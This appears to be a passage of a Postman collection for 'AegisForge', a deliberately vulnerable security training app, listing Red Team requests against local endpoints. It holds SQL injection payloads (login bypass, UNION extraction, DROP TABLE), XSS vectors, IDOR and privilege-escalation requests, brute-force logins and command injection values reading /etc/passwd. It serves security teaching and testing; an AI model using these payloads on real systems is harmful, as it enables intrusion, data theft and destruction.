@@ -1,0 +1,4734 @@
+{
+  "info": {
+    "_postman_id": "aegisforge-complete-v2",
+    "name": "AegisForge Complete Security Testing Collection",
+    "description": "Comprehensive collection with 100+ API requests for testing Red Team (vulnerable) and Blue Team (secure) endpoints",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "version": "2.1.0"
+  },
+  "auth": {
+    "type": "bearer",
+    "bearer": [
+      {
+        "key": "token",
+        "value": "{{access_token}}",
+        "type": "string"
+      }
+    ]
+  },
+  "variable": [
+    {
+      "key": "red_base_url",
+      "value": "http://localhost:5000",
+      "type": "string"
+    },
+    {
+      "key": "blue_base_url",
+      "value": "http://localhost:5001",
+      "type": "string"
+    },
+    {
+      "key": "access_token",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "user_id",
+      "value": "1",
+      "type": "string"
+    },
+    {
+      "key": "csrf_token",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "admin_token",
+      "value": "",
+      "type": "string"
+    }
+  ],
+  "item": [
+    {
+      "name": "\ud83d\udd34 RED TEAM - Vulnerable Endpoints (Port 5000)",
+      "description": "Intentionally vulnerable endpoints for security testing and learning",
+      "item": [
+        {
+          "name": "01 - Authentication",
+          "item": [
+            {
+              "name": "Register User",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/auth/register",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "register"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"name\": \"Test User\", \"email\": \"testuser@aegisforge.com\", \"password\": \"password123\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Status code is 200 or 201', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 201]);",
+                      "});",
+                      "pm.test('Response has user data', function () {",
+                      "    var jsonData = pm.response.json();",
+                      "    pm.expect(jsonData).to.have.property('user');",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Login User",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/auth/login",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"testuser@aegisforge.com\", \"password\": \"password123\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Status code is 200', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});",
+                      "pm.test('Response has access_token', function () {",
+                      "    var jsonData = pm.response.json();",
+                      "    pm.expect(jsonData).to.have.property('access_token');",
+                      "    pm.collectionVariables.set('access_token', jsonData.access_token);",
+                      "    if (jsonData.user && jsonData.user.id) {",
+                      "        pm.collectionVariables.set('user_id', jsonData.user.id);",
+                      "    }",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Register with Weak Password",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/auth/register",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "register"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"name\": \"Weak User\", \"email\": \"weak@aegisforge.com\", \"password\": \"123\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Weak password accepted (vulnerability)', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 201]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Brute Force Login - Attempt 1",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/auth/login",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"admin@aegisforge.com\", \"password\": \"password\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('No rate limiting (vulnerability)', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 401]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Brute Force Login - Attempt 2",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/auth/login",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"admin@aegisforge.com\", \"password\": \"admin\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Brute Force Login - Attempt 3",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/auth/login",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"admin@aegisforge.com\", \"password\": \"admin123\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Brute Force Login - Attempt 4",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/auth/login",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"admin@aegisforge.com\", \"password\": \"12345\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Brute Force Login - Attempt 5",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/auth/login",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"admin@aegisforge.com\", \"password\": \"qwerty\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Login Admin User",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/auth/login",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"admin@aegisforge.com\", \"password\": \"admin123\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "if (pm.response.code === 200) {",
+                      "    var jsonData = pm.response.json();",
+                      "    if (jsonData.access_token) {",
+                      "        pm.collectionVariables.set('admin_token', jsonData.access_token);",
+                      "    }",
+                      "}"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Get User Profile",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/auth/profile",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "profile"
+                  ]
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Status code is 200', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "02 - SQL Injection",
+          "item": [
+            {
+              "name": "Boolean-Based SQLi - True Condition",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/1' OR '1'='1",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1' OR '1'='1"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('SQLi vulnerability exists', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Boolean-Based SQLi - False Condition",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/1' AND '1'='2",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1' AND '1'='2"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Time-Based Blind SQLi",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/1' AND SLEEP(5)--",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1' AND SLEEP(5)--"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Response delay indicates SQLi', function () {",
+                      "    pm.expect(pm.response.responseTime).to.be.above(3000);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Union-Based SQLi - Column Count",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/1' UNION SELECT NULL,NULL,NULL--",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1' UNION SELECT NULL,NULL,NULL--"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Union-Based SQLi - Extract Data",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/1' UNION SELECT id,email,password FROM users--",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1' UNION SELECT id,email,password FROM users--"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Data extraction successful', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "SQLi in Login - Bypass Authentication",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/auth/login",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"admin@aegisforge.com' OR '1'='1'--\", \"password\": \"anything\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Authentication bypassed', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 401, 500]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "SQLi in Search",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/search?q=test' OR 1=1--",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "search"
+                  ],
+                  "query": [
+                    {
+                      "key": "q",
+                      "value": "test' OR 1=1--"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "SQLi - Extract Database Version",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/1' UNION SELECT NULL,@@version,NULL--",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1' UNION SELECT NULL,@@version,NULL--"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "SQLi - Extract Table Names",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "SQLi - Extract Column Names",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/1' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "SQLi in Order ID",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/orders/1' OR 1=1--",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "orders",
+                    "1' OR 1=1--"
+                  ]
+                }
+              }
+            },
+            {
+              "name": "SQLi - Stacked Queries",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/1'; DROP TABLE users--",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1'; DROP TABLE users--"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "name": "03 - Cross-Site Scripting (XSS)",
+          "item": [
+            {
+              "name": "Reflected XSS - GET Parameter",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/search?q=<script>alert('XSS')</script>",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "search"
+                  ],
+                  "query": [
+                    {
+                      "key": "q",
+                      "value": "<script>alert('XSS')</script>"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('XSS payload reflected', function () {",
+                      "    pm.expect(pm.response.text()).to.include('<script>');",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Reflected XSS - URL Path",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/<script>alert('XSS')</script>",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "<script>alert('XSS')<",
+                    "script>"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Reflected XSS - Image Tag",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/search?q=<img src=x onerror=alert('XSS')>",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "search"
+                  ],
+                  "query": [
+                    {
+                      "key": "q",
+                      "value": "<img src=x onerror=alert('XSS')>"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "Stored XSS - POST Comment",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/comments",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "comments"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"comment\": \"<script>alert('Stored XSS')</script>\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Comment stored successfully', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 201]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Stored XSS - POST Profile",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/profile",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "profile"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"name\": \"<script>alert('XSS')</script>\", \"bio\": \"Normal bio\"}"
+                }
+              }
+            },
+            {
+              "name": "Stored XSS - GET Comments",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/comments",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "comments"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('XSS payload may be in response', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "DOM XSS - GET with Hash",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/page#<script>alert('DOM XSS')</script>",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "page#<script>alert('DOM XSS')<",
+                    "script>"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "XSS - Event Handler",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/search?q=<body onload=alert('XSS')>",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "search"
+                  ],
+                  "query": [
+                    {
+                      "key": "q",
+                      "value": "<body onload=alert('XSS')>"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "XSS - SVG Vector",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/search?q=<svg/onload=alert('XSS')>",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "search"
+                  ],
+                  "query": [
+                    {
+                      "key": "q",
+                      "value": "<svg/onload=alert('XSS')>"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "XSS - JavaScript Protocol",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/redirect?url=javascript:alert('XSS')",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "redirect"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "javascript:alert('XSS')"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "name": "04 - Access Control & IDOR",
+          "item": [
+            {
+              "name": "IDOR - Get Own User Profile",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/{{user_id}}",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "{{user_id}}"
+                  ]
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Status code is 200', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "IDOR - Get Other User Profile",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/2",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "2"
+                  ]
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('IDOR vulnerability - accessing other user data', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "IDOR - Get Admin User",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/1",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "1"
+                  ]
+                }
+              }
+            },
+            {
+              "name": "IDOR - Update Other User",
+              "request": {
+                "method": "PUT",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/2",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "2"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"name\": \"Hacked User\", \"email\": \"hacked@aegisforge.com\"}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Can modify other user (IDOR)', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "IDOR - Delete Other User",
+              "request": {
+                "method": "DELETE",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/3",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "3"
+                  ]
+                }
+              }
+            },
+            {
+              "name": "IDOR - Access Other User Orders",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/2/orders",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "2",
+                    "orders"
+                  ]
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Accessing other user orders', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "IDOR - View Other User's Private Data",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/2/private",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "2",
+                    "private"
+                  ]
+                }
+              }
+            },
+            {
+              "name": "Privilege Escalation - Regular to Admin",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{red_base_url}}/api/users/{{user_id}}/promote",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "{{user_id}}",
+                    "promote"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"role\": \"admin\"}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Privilege escalation attempt', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Privilege Escalation - Access Admin Panel",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/admin/dashboard",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "admin",
+                    "dashboard"
+                  ]
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Unauthorized access to admin panel', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Privilege Escalation - Admin Action",
+              "request": {
+                "method": "DELETE",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/admin/users/5",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "admin",
+                    "users",
+                    "5"
+                  ]
+                }
+              }
+            },
+            {
+              "name": "Missing Function Level Access Control",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/admin/logs",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "admin",
+                    "logs"
+                  ]
+                }
+              }
+            }
+          ]
+        },
+        {
+          "name": "05 - Command Injection",
+          "item": [
+            {
+              "name": "OS Command Injection - Ping",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/ping?host=127.0.0.1; cat /etc/passwd",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "ping"
+                  ],
+                  "query": [
+                    {
+                      "key": "host",
+                      "value": "127.0.0.1; cat /etc/passwd"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Command injection vulnerability', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 500]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "OS Command Injection - DNS Lookup",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/dns?domain=google.com | whoami",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "dns"
+                  ],
+                  "query": [
+                    {
+                      "key": "domain",
+                      "value": "google.com | whoami"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "OS Command Injection - With Pipe",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/ping?host=127.0.0.1 | ls -la",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "ping"
+                  ],
+                  "query": [
+                    {
+                      "key": "host",
+                      "value": "127.0.0.1 | ls -la"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "OS Command Injection - With AND",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/ping?host=127.0.0.1 && id",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "ping"
+                  ],
+                  "query": [
+                    {
+                      "key": "host",
+                      "value": "127.0.0.1 && id"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "OS Command Injection - With Backticks",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/ping?host=`whoami`",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "ping"
+                  ],
+                  "query": [
+                    {
+                      "key": "host",
+                      "value": "`whoami`"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              }
+            },
+            {
+              "name": "OS Command Injection - File Read",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{red_base_url}}/api/ping?host=127.0.0.1; cat /etc/hosts",
+                  "host": [
+                    "{{red_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "ping"
+                  ],
+                  "query": [
+                    {
+                      "key": "host",
+                      "value": "127.0.0.1; cat /etc/hosts"
+                    }
+                  ]
+                },
+                "auth": {
